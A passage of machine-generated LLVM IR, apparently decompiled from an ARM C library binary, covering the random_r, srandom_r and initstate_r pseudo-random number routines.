  %v5_12fe4 = add i32 %v4_12fe4, %v3_12fc0
  %v3_12fec = add i32 %v3_12fd4, -4
  %v4_12fec = inttoptr i32 %v3_12fec to i32*
  store i32 %v5_12fe4, i32* %v4_12fec, align 4
  br label %bb

bb:                                               ; preds = %.thread7, %.thread8
  %v1_12ff0 = add i32 %arg1, 4
  store i32 %v1_12ff0, i32* %r6.global-to-local, align 4
  %v2_12ff4 = inttoptr i32 %arg1 to i32*
  %v3_12ff4 = load i32, i32* %v2_12ff4, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_12ffc = srem i32 %v3_12ff4, 5
  store i32 %v2_12ffc, i32* %r0.global-to-local, align 4
  %v2_13008 = and i32 %v2_12ffc, 1073741824
  %v3_13008 = icmp ne i32 %v2_13008, 0
  %v4_13008 = mul nsw i32 %v2_12ffc, 4
  %v2_1300c = icmp ne i32 %v2_12ffc, 4
  %v3_1300c = and i1 %v3_13008, %v2_1300c
  br i1 %v3_1300c, label %dec_label_pc_13068, label %dec_label_pc_13010

dec_label_pc_13010:                               ; preds = %bb
  %v5_13008 = add i32 %v4_13008, ptrtoint (i32* @global_var_1acb8.787 to i32)
  %v1_13010 = add i32 %v4_13008, add (i32 ptrtoint (i32* @global_var_1acb8.787 to i32), i32 20)
  %v2_13010 = inttoptr i32 %v1_13010 to i32*
  %v3_13010 = load i32, i32* %v2_13010, align 4
  store i32 %v3_13010, i32* %r5.global-to-local, align 4
  %v6_13014 = inttoptr i32 %v5_13008 to i32*
  %v7_13014 = load i32, i32* %v6_13014, align 4
  store i32 %v7_13014, i32* %r7.global-to-local, align 4
  %v2_13018 = icmp eq i32 %v2_12ffc, 0
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_13020 = load i32, i32* %r4.global-to-local, align 4
  %v2_13020 = add i32 %v1_13020, 16
  %v3_13020 = inttoptr i32 %v2_13020 to i32*
  store i32 %v3_13010, i32* %v3_13020, align 4
  %v0_13024 = load i32, i32* %r7.global-to-local, align 4
  %v1_13024 = load i32, i32* %r4.global-to-local, align 4
  %v2_13024 = add i32 %v1_13024, 20
  %v3_13024 = inttoptr i32 %v2_13024 to i32*
  store i32 %v0_13024, i32* %v3_13024, align 4
  %v0_13028 = load i32, i32* %r0.global-to-local, align 4
  %v1_13028 = load i32, i32* %r4.global-to-local, align 4
  %v2_13028 = add i32 %v1_13028, 12
  %v3_13028 = inttoptr i32 %v2_13028 to i32*
  store i32 %v0_13028, i32* %v3_13028, align 4
  br i1 %v2_13018, label %dec_label_pc_13054, label %dec_label_pc_13030

dec_label_pc_13030:                               ; preds = %dec_label_pc_13010
  %v0_13030 = load i32, i32* %r6.global-to-local, align 4
  %v1_13030 = add i32 %v0_13030, -4
  %v2_13030 = inttoptr i32 %v1_13030 to i32*
  %v3_13030 = load i32, i32* %v2_13030, align 4
  %v1_13034 = load i32, i32* %r1.global-to-local, align 4
  %v2_13034 = sdiv i32 %v3_13030, %v1_13034
  store i32 %v2_13034, i32* %r0.global-to-local, align 4
  %v4_13038 = mul i32 %v2_13034, 4
  %v5_13038 = add i32 %v4_13038, %v0_13030
  %v1_1303c = load i32, i32* %r4.global-to-local, align 4
  %v2_1303c = add i32 %v1_1303c, 4
  %v3_1303c = inttoptr i32 %v2_1303c to i32*
  store i32 %v5_13038, i32* %v3_1303c, align 4
  %v0_13040 = load i32, i32* %r0.global-to-local, align 4
  %v1_13040 = load i32, i32* %r7.global-to-local, align 4
  %v2_13040 = add i32 %v1_13040, %v0_13040
  %v0_13044 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13044, i32* %r1.global-to-local, align 4
  %v2_13048 = srem i32 %v2_13040, %v0_13044
  %v0_1304c = load i32, i32* %r6.global-to-local, align 4
  %v4_1304c = mul i32 %v2_13048, 4
  %v5_1304c = add i32 %v0_1304c, %v4_1304c
  store i32 %v5_1304c, i32* %r0.global-to-local, align 4
  %v1_13050 = load i32, i32* %r4.global-to-local, align 4
  %v2_13050 = inttoptr i32 %v1_13050 to i32*
  store i32 %v5_1304c, i32* %v2_13050, align 4
  br label %dec_label_pc_13054

dec_label_pc_13054:                               ; preds = %dec_label_pc_13010, %dec_label_pc_13030
  %v0_13054 = load i32, i32* %r6.global-to-local, align 4
  %v1_13054 = load i32, i32* %r5.global-to-local, align 4
  %v4_13054 = mul i32 %v1_13054, 4
  %v5_13054 = add i32 %v4_13054, %v0_13054
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1305c = load i32, i32* %r4.global-to-local, align 4
  %v2_1305c = add i32 %v1_1305c, 24
  %v3_1305c = inttoptr i32 %v2_1305c to i32*
  store i32 %v5_13054, i32* %v3_1305c, align 4
  %v0_13060 = load i32, i32* %r6.global-to-local, align 4
  %v1_13060 = load i32, i32* %r4.global-to-local, align 4
  %v2_13060 = add i32 %v1_13060, 8
  %v3_13060 = inttoptr i32 %v2_13060 to i32*
  store i32 %v0_13060, i32* %v3_13060, align 4
  %v2_13064 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13064, i32* %r4.global-to-local, align 4
  ret i32 0

dec_label_pc_13068:                               ; preds = %bb
  %v0_13068 = call i32 @__errno_location()
  %v2_13070 = inttoptr i32 %v0_13068 to i32*
  store i32 22, i32* %v2_13070, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13078 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13078, i32* %r4.global-to-local, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_12ffc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %tmp, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 3, 4, 0, 1, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13054, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v1_13080 = add i32 %tmp, 12
  %v2_13080 = inttoptr i32 %v1_13080 to i32*
  %v3_13080 = load i32, i32* %v2_13080, align 4
  store i32 %v3_13080, i32* %r3.global-to-local, align 4
  %v2_13084 = icmp eq i32 %v3_13080, 0
  %v3_13088 = load i32, i32* @r4, align 4
  store i32 %v3_13088, i32* %stack_var_-12, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_13094 = add i32 %tmp, 8
  %v2_13094 = inttoptr i32 %v1_13094 to i32*
  %v3_13094 = load i32, i32* %v2_13094, align 4
  store i32 %v3_13094, i32* %lr.global-to-local, align 4
  br i1 %v2_13084, label %dec_label_pc_1309c, label %dec_label_pc_130c0

dec_label_pc_1309c:                               ; preds = %entry
  %v1_1309c = inttoptr i32 %v3_13094 to i32*
  %v2_1309c = load i32, i32* %v1_1309c, align 4
  store i32 %v2_1309c, i32* %r2.global-to-local, align 4
  %v2_130a4 = mul i32 %v2_1309c, 1103515245
  %v1_130ac = add i32 %v2_130a4, 12345
  %tmp10 = bitcast i32 %v1_130ac to float
  %tmp11 = call float @fabsf(float %tmp10)
  %v1_130b0 = bitcast float %tmp11 to i32
  store i32 %v1_130b0, i32* %r3.global-to-local, align 4
  store i32 %v1_130b0, i32* %v1_1309c, align 4
  %v0_130b8 = load i32, i32* %r3.global-to-local, align 4
  %v2_130b8 = inttoptr i32 %arg2 to i32*
  store i32 %v0_130b8, i32* %v2_130b8, align 4
  br label %dec_label_pc_13104

dec_label_pc_130c0:                               ; preds = %entry
  %v2_130c0 = load i32, i32* %arg1, align 4
  store i32 %v2_130c0, i32* %r2.global-to-local, align 4
  %v1_130c4 = add i32 %tmp, 4
  %v2_130c4 = inttoptr i32 %v1_130c4 to i32*
  %v3_130c4 = load i32, i32* %v2_130c4, align 4
  store i32 %v3_130c4, i32* %r0.global-to-local, align 4
  %v1_130c8 = inttoptr i32 %v2_130c0 to i32*
  %v2_130c8 = load i32, i32* %v1_130c8, align 4
  store i32 %v2_130c8, i32* %r3.global-to-local, align 4
  %v1_130cc = inttoptr i32 %v3_130c4 to i32*
  %v2_130cc = load i32, i32* %v1_130cc, align 4
  %v4_130cc = add i32 %v3_130c4, 4
  store i32 %v4_130cc, i32* %r0.global-to-local, align 4
  %v2_130d0 = add i32 %v2_130cc, %v2_130c8
  store i32 %v2_130d0, i32* %r3.global-to-local, align 4
  store i32 %v2_130d0, i32* %v1_130c8, align 4
  %v3_130d4 = load i32, i32* %r2.global-to-local, align 4
  %v4_130d4 = add i32 %v3_130d4, 4
  store i32 %v4_130d4, i32* %r2.global-to-local, align 4
  %v0_130d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_130d8 = add i32 %v0_130d8, 24
  %v2_130d8 = inttoptr i32 %v1_130d8 to i32*
  %v3_130d8 = load i32, i32* %v2_130d8, align 4
  store i32 %v3_130d8, i32* %r4.global-to-local, align 4
  %v0_130dc = load i32, i32* %r3.global-to-local, align 4
  %v3_130dc = udiv i32 %v0_130dc, 2
  store i32 %v3_130dc, i32* %r3.global-to-local, align 4
  %v3_130e0 = icmp ult i32 %v4_130d4, %v3_130d8
  %v1_130e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_130e4 = inttoptr i32 %v1_130e4 to i32*
  store i32 %v3_130dc, i32* %v2_130e4, align 4
  br i1 %v3_130e0, label %dec_label_pc_130f4, label %bb

bb:                                               ; preds = %dec_label_pc_130c0
  %v1_130e8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_130e8, i32* %r2.global-to-local, align 4
  %v0_130ec = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_130ec, i32* %r3.global-to-local, align 4
  br label %bb9

dec_label_pc_130f4:                               ; preds = %dec_label_pc_130c0
  %v0_130ec1 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_130ec1, i32* %r3.global-to-local, align 4
  %v1_130f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_130f4 = icmp ult i32 %v0_130ec1, %v1_130f4
  br i1 %v3_130f4, label %bb8, label %.thread2

bb8:                                              ; preds = %dec_label_pc_130f4
  store i32 %v0_130ec1, i32* %r3.global-to-local, align 4
  br label %bb9

.thread2:                                         ; preds = %dec_label_pc_130f4
  %v1_130fc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_130fc, i32* %r3.global-to-local, align 4
  br label %bb9

bb9:                                              ; preds = %bb, %bb8, %.thread2
  %v0_13100 = load i32, i32* %ip.global-to-local, align 4
  %v1_13100 = inttoptr i32 %v0_13100 to i32*
  %v2_13100 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_13100, i32* %v1_13100, align 4
  %v3_13100 = add i32 %v0_13100, 4
  %v4_13100 = inttoptr i32 %v3_13100 to i32*
  %v5_13100 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_13100, i32* %v4_13100, align 4
  br label %dec_label_pc_13104

dec_label_pc_13104:                               ; preds = %dec_label_pc_1309c, %bb9
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_13108 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_13108, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_130ec1, { 1, 0, 2 }
  uselistorder i32 %v3_130dc, { 1, 0 }
  uselistorder i32 %v1_130b0, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 0, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder label %dec_label_pc_13104, { 1, 0 }
  uselistorder label %bb9, { 2, 1, 0 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_13110 = load i32, i32* @r4, align 4
  store i32 %v3_13110, i32* %stack_var_-32, align 4
  %v6_13110 = load i32, i32* @r5, align 4
  %v1_13114 = add i32 %tmp, 12
  %v2_13114 = inttoptr i32 %v1_13114 to i32*
  %v3_13114 = load i32, i32* %v2_13114, align 4
  %v2_1311c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %tmp29 = icmp ugt i32 %v3_13114, 4
  br i1 %tmp29, label %.dec_label_pc_131c8_crit_edge, label %dec_label_pc_1312c

.dec_label_pc_131c8_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_131c8

dec_label_pc_1312c:                               ; preds = %entry
  %v0_1312c = load i32, i32* @r0, align 4
  %v2_1312c = icmp eq i32 %v0_1312c, 0
  %v1_13130 = add i32 %tmp, 8
  %v2_13130 = inttoptr i32 %v1_13130 to i32*
  %v3_13130 = load i32, i32* %v2_13130, align 4
  store i32 %v3_13130, i32* %r7.global-to-local, align 4
  br i1 %v2_1312c, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_1312c
  store i32 1, i32* @r0, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_1312c, %bb
  %v0_1313c = phi i32 [ %v0_1312c, %dec_label_pc_1312c ], [ 1, %bb ]
  %v2_13138 = icmp eq i32 %v3_13114, 0
  %v2_1313c = inttoptr i32 %v3_13130 to i32*
  store i32 %v0_1313c, i32* %v2_1313c, align 4
  br i1 %v2_13138, label %dec_label_pc_131c4, label %dec_label_pc_13144

dec_label_pc_13144:                               ; preds = %bb21
  %v1_13144 = add i32 %tmp, 16
  %v2_13144 = inttoptr i32 %v1_13144 to i32*
  %v3_13144 = load i32, i32* %v2_13144, align 4
  store i32 %v3_13144, i32* %sb.global-to-local, align 4
  %v0_13148 = load i32, i32* @r0, align 4
  %v0_1314c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1314c, i32* %sl.global-to-local, align 4
  store i32 2, i32* %r8.global-to-local, align 4
  %v5_1319423 = icmp sgt i32 %v3_13144, 1
  br i1 %v5_1319423, label %dec_label_pc_13158, label %dec_label_pc_13198

dec_label_pc_13158:                               ; preds = %dec_label_pc_13144, %dec_label_pc_13158
  %v0_1316825 = phi i32 [ %v0_13188.pre, %dec_label_pc_13158 ], [ %v0_13148, %dec_label_pc_13144 ]
  %v1_1318024 = phi i32 [ %v5_13180, %dec_label_pc_13158 ], [ %v0_1314c, %dec_label_pc_13144 ]
  %v2_13158 = srem i32 %v0_1316825, 127773
  %v2_13164 = mul i32 %v2_13158, 16807
  %v2_1316c = sdiv i32 %v0_1316825, 127773
  %tmp30 = mul nsw i32 %v2_1316c, -2836
  %v2_13178 = add i32 %v2_13164, %tmp30
  %v8_13178 = icmp slt i32 %v2_13178, 0
  %v2_1317c = add i32 %v2_13178, 2147483647
  %v2_1317c.v2_13178 = select i1 %v8_13178, i32 %v2_1317c, i32 %v2_13178
  store i32 %v2_1317c.v2_13178, i32* @r5, align 4
  %v2_13180 = add i32 %v1_1318024, 4
  %v3_13180 = inttoptr i32 %v2_13180 to i32*
  store i32 %v2_1317c.v2_13178, i32* %v3_13180, align 4
  %v4_13180 = load i32, i32* %sl.global-to-local, align 4
  %v5_13180 = add i32 %v4_13180, 4
  store i32 %v5_13180, i32* %sl.global-to-local, align 4
  %v0_13184.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_13184.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_13188.pre = load i32, i32* @r5, align 4
  %v1_13190 = add i32 %v0_13184.pre, 1
  store i32 %v1_13190, i32* %r8.global-to-local, align 4
  %v5_13194 = icmp slt i32 %v0_13184.pre, %v1_13184.pre
  br i1 %v5_13194, label %dec_label_pc_13158, label %dec_label_pc_13184.dec_label_pc_13198_crit_edge

dec_label_pc_13184.dec_label_pc_13198_crit_edge:  ; preds = %dec_label_pc_13158
  %v0_131a4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13198

dec_label_pc_13198:                               ; preds = %dec_label_pc_13184.dec_label_pc_13198_crit_edge, %dec_label_pc_13144
  %v0_131a4 = phi i32 [ %v0_131a4.pre, %dec_label_pc_13184.dec_label_pc_13198_crit_edge ], [ %v0_1314c, %dec_label_pc_13144 ]
  %v0_1319c.lcssa = phi i32 [ %v1_13184.pre, %dec_label_pc_13184.dec_label_pc_13198_crit_edge ], [ %v3_13144, %dec_label_pc_13144 ]
  %v2_1319c = mul i32 %v0_1319c.lcssa, 10
  store i32 %v2_1319c, i32* @r4, align 4
  %v0_131a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_131a0 = add i32 %v0_131a0, 20
  %v2_131a0 = inttoptr i32 %v1_131a0 to i32*
  %v3_131a0 = load i32, i32* %v2_131a0, align 4
  %v4_131a4 = mul i32 %v3_131a0, 4
  %v5_131a4 = add i32 %v0_131a4, %v4_131a4
  %v1_131a8 = inttoptr i32 %v0_131a0 to i32*
  store i32 %v5_131a4, i32* %v1_131a8, align 4
  %v3_131a8 = add i32 %v0_131a0, 4
  %v4_131a8 = inttoptr i32 %v3_131a8 to i32*
  %v5_131a8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_131a8, i32* %v4_131a8, align 4
  br label %dec_label_pc_131b4

dec_label_pc_131b0:                               ; preds = %dec_label_pc_131b4
  %v0_131b8 = load i32, i32* %r6.global-to-local, align 4
  %v2_131b0 = inttoptr i32 %v0_131b8 to i32*
  %v3_131b0 = call i32 @__GI_random_r(i32* %v2_131b0, i32 %v2_1311c)
  br label %dec_label_pc_131b4

dec_label_pc_131b4:                               ; preds = %dec_label_pc_13198, %dec_label_pc_131b0
  %v0_131b4 = load i32, i32* @r4, align 4
  %v1_131b4 = add i32 %v0_131b4, -1
  store i32 %v1_131b4, i32* @r4, align 4
  %v6_131b4 = icmp slt i32 %v1_131b4, 0
  br i1 %v6_131b4, label %dec_label_pc_131c4, label %dec_label_pc_131b0

dec_label_pc_131c4:                               ; preds = %dec_label_pc_131b4, %bb21
  %v2_131cc.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_131c8

dec_label_pc_131c8:                               ; preds = %.dec_label_pc_131c8_crit_edge, %dec_label_pc_131c4
  %v2_131cc = phi i32 [ %v3_13110, %.dec_label_pc_131c8_crit_edge ], [ %v2_131cc.pre, %dec_label_pc_131c4 ]
  %v26_131cc = phi i32 [ -1, %.dec_label_pc_131c8_crit_edge ], [ 0, %dec_label_pc_131c4 ]
  store i32 %v2_131cc, i32* @r4, align 4
  store i32 %v6_13110, i32* @r5, align 4
  ret i32 %v26_131cc

; uselistorder directives
  uselistorder i32 %v1_131b4, { 1, 0 }
  uselistorder i32 %v0_131a0, { 1, 0, 2 }
  uselistorder i32 %v0_13184.pre, { 1, 0 }
  uselistorder i32 %v5_13180, { 1, 0 }
  uselistorder i32 %v2_13178, { 2, 1, 0 }
  uselistorder i32 %v0_1316825, { 1, 0 }
  uselistorder i32 %v0_1314c, { 1, 0, 2 }
  uselistorder i32 %v3_13144, { 1, 0, 2 }
  uselistorder i32 %v3_13114, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 3, 1 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_131c8, { 1, 0 }
  uselistorder label %dec_label_pc_131b4, { 1, 0 }
  uselistorder label %dec_label_pc_13158, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_131d0:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_131d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_131d0, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_131d0
  %v2_131d0 = load i32, i32* @r7, align 4
  %v5_131d0 = udiv i32 %v2_131d0, 8
  %v6_131d0 = and i32 %v5_131d0, %arg1
  store i32 %v6_131d0, i32* %r4.global-to-local, align 4
  %v2_131d4 = load i32, i32* @sp, align 4
  %v8_131d4 = shl i32 %v2_131d4, %arg3
  %v9_131d4 = and i32 %v8_131d4, %arg2
  call void @__pseudo_branch(i32 %v9_131d4)
  %v0_131d8.pr.pr = load i1, i1* @cpsr_z, align 1
  %v1_131d8 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v0_131d8.pr.pr, label %bb, label %.thread1

bb:                                               ; preds = %.thread
  %v2_131d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_131d8 = load i32, i32* @fp, align 4
  %v8_131d8 = shl i32 %v2_131d8, %v3_131d8
  %v9_131d8 = and i32 %v8_131d8, %v1_131d8
  store i32 %v9_131d8, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread, %dec_label_pc_131d0, %bb
  %v10_131d8 = phi i32 [ %arg1, %dec_label_pc_131d0 ], [ %v9_131d8, %bb ], [ %v1_131d8, %.thread ]
  ret i32 %v10_131d8

; uselistorder directives
  uselistorder i32 %v1_131d8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 2, 0, 1 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_131e0 = load i32, i32* @r4, align 4
  store i32 %v3_131e0, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_13200, label %dec_label_pc_131f0

dec_label_pc_131f0:                               ; preds = %entry
  %v2_131f0 = icmp ugt i32 %arg2, 254
  %v7_131f0 = icmp eq i32 %arg2, 255
  %v2_131f4 = xor i1 %v7_131f0, true
  %v3_131f4 = and i1 %v2_131f0, %v2_131f4
  br i1 %v3_131f4, label %bb, label %bb20

bb:                                               ; preds = %dec_label_pc_131f0
  store i32 4, i32* @r4, align 4
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_131f0, %bb
  %v1_132287 = phi i32 [ %v3_131e0, %dec_label_pc_131f0 ], [ 4, %bb ]
  %v2_131f8 = xor i1 %v2_131f0, true
  %v3_131f8 = or i1 %v7_131f0, %v2_131f8
  br i1 %v3_131f8, label %bb21, label %bb25

bb21:                                             ; preds = %bb20
  store i32 3, i32* @r4, align 4
  br label %bb25

dec_label_pc_13200:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_13218, label %dec_label_pc_13208

dec_label_pc_13208:                               ; preds = %dec_label_pc_13200
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_13284

.thread10:                                        ; preds = %dec_label_pc_13208
  store i32 0, i32* @r4, align 4
  br label %bb25

dec_label_pc_13218:                               ; preds = %dec_label_pc_13200
  %v2_13218 = icmp ugt i32 %arg2, 62
  %v7_13218 = icmp eq i32 %arg2, 63
  %v2_1321c = xor i1 %v7_13218, true
  %v3_1321c = and i1 %v2_13218, %v2_1321c
  br i1 %v3_1321c, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_13218
  store i32 2, i32* @r4, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_13218, %bb22
  %v1_132286 = phi i32 [ %v3_131e0, %dec_label_pc_13218 ], [ 2, %bb22 ]
  %v2_13220 = xor i1 %v2_13218, true
  %v3_13220 = or i1 %v7_13218, %v2_13220
  br i1 %v3_13220, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  store i32 1, i32* @r4, align 4
  br label %bb25

bb25:                                             ; preds = %.thread10, %bb21, %bb20, %bb23, %bb24
  %v1_13230 = phi i32 [ 3, %bb21 ], [ %v1_132287, %bb20 ], [ %v1_132286, %bb23 ], [ 1, %bb24 ], [ 0, %.thread10 ]
  store i32 ptrtoint (i32* @global_var_1acb8.787 to i32), i32* %r2.global-to-local, align 4
  %v4_13228 = mul i32 %v1_13230, 4
  %v5_13228 = add i32 %v4_13228, ptrtoint (i32* @global_var_1acb8.787 to i32)
  store i32 %v5_13228, i32* %r3.global-to-local, align 4
  %v1_1322c = add i32 %v4_13228, add (i32 ptrtoint (i32* @global_var_1acb8.787 to i32), i32 20)
  %v2_1322c = inttoptr i32 %v1_1322c to i32*
  %v3_1322c = load i32, i32* %v2_1322c, align 4
  store i32 %v3_1322c, i32* %r1.global-to-local, align 4
  %v6_13230 = inttoptr i32 %v5_13228 to i32*
  %v7_13230 = load i32, i32* %v6_13230, align 4
  store i32 %v7_13230, i32* %r2.global-to-local, align 4
  %v1_13234 = add i32 %tmp, 4
  store i32 %v1_13234, i32* @r6, align 4
  %v4_13238 = mul i32 %v3_1322c, 4
  %v5_13238 = add i32 %v4_13238, %v1_13234
  store i32 %v5_13238, i32* %r3.global-to-local, align 4
  %v2_1323c = add i32 %arg3, 24
  %v3_1323c = inttoptr i32 %v2_1323c to i32*
  store i32 %v5_13238, i32* %v3_1323c, align 4
  %v0_13240 = load i32, i32* %r2.global-to-local, align 4
  %v1_13240 = load i32, i32* @r5, align 4
  %v2_13240 = add i32 %v1_13240, 20
  %v3_13240 = inttoptr i32 %v2_13240 to i32*
  store i32 %v0_13240, i32* %v3_13240, align 4
  %v0_13244 = load i32, i32* %r1.global-to-local, align 4
  %v1_13244 = load i32, i32* @r5, align 4
  %v2_13244 = add i32 %v1_13244, 16
  %v3_13244 = inttoptr i32 %v2_13244 to i32*
  store i32 %v0_13244, i32* %v3_13244, align 4
  %v0_13248 = load i32, i32* @r4, align 4
  %v1_13248 = load i32, i32* @r5, align 4
  %v2_13248 = add i32 %v1_13248, 12
  %v3_13248 = inttoptr i32 %v2_13248 to i32*
  store i32 %v0_13248, i32* %v3_13248, align 4
  %v0_1324c = load i32, i32* @r6, align 4
  %v1_1324c = load i32, i32* @r5, align 4
  %v2_1324c = add i32 %v1_1324c, 8
  %v3_1324c = inttoptr i32 %v2_1324c to i32*
  store i32 %v0_1324c, i32* %v3_1324c, align 4
  %v0_13250 = load i32, i32* @r5, align 4
  store i32 %v0_13250, i32* %r1.global-to-local, align 4
  %v0_13254 = load i32, i32* @r0, align 4
  %v2_13254 = inttoptr i32 %v0_13254 to i32*
  %v3_13254 = call i32 @srandom_r(i32* %v2_13254, i32 %v0_13250)
  store i32 %v3_13254, i32* %r0.global-to-local, align 4
  %v0_13258 = load i32, i32* @r4, align 4
  %v2_13258 = icmp eq i32 %v0_13258, 0
  br i1 %v2_13258, label %bb26, label %.thread4

bb26:                                             ; preds = %bb25
  %v1_1327412 = load i32, i32* @r7, align 4
  %v2_1327413 = inttoptr i32 %v1_1327412 to i32*
  store i32 0, i32* %v2_1327413, align 4
  %v1_13278 = load i32, i32* @r4, align 4
  store i32 %v1_13278, i32* %r0.global-to-local, align 4
  br label %bb27

.thread4:                                         ; preds = %bb25
  %v1_1325c = load i32, i32* @r5, align 4
  %v2_1325c = add i32 %v1_1325c, 4
  %v3_1325c = inttoptr i32 %v2_1325c to i32*
  %v4_1325c = load i32, i32* %v3_1325c, align 4
  %v1_13260 = load i32, i32* @r6, align 4
  %v3_13260 = sub i32 %v4_1325c, %v1_13260
  %v4_13264 = sdiv i32 %v3_13260, 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_1326c = mul i32 %v4_13264, 5
  %v5_1326c = add i32 %v4_1326c, %v0_13258
  store i32 %v5_1326c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_13274 = load i32, i32* @r7, align 4
  %v2_13274 = inttoptr i32 %v1_13274 to i32*
  store i32 0, i32* %v2_13274, align 4
  %v1_1327c = load i32, i32* %r3.global-to-local, align 4
  %v2_1327c = load i32, i32* @r7, align 4
  %v3_1327c = inttoptr i32 %v2_1327c to i32*
  store i32 %v1_1327c, i32* %v3_1327c, align 4
  %v17_13280.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb27

bb27:                                             ; preds = %bb26, %.thread4
  %v17_13280 = phi i32 [ %v1_13278, %bb26 ], [ %v17_13280.pre, %.thread4 ]
  %v2_13280 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13280, i32* %r4.global-to-local, align 4
  ret i32 %v17_13280

dec_label_pc_13284:                               ; preds = %dec_label_pc_13208
  %v0_13284 = call i32 @__errno_location()
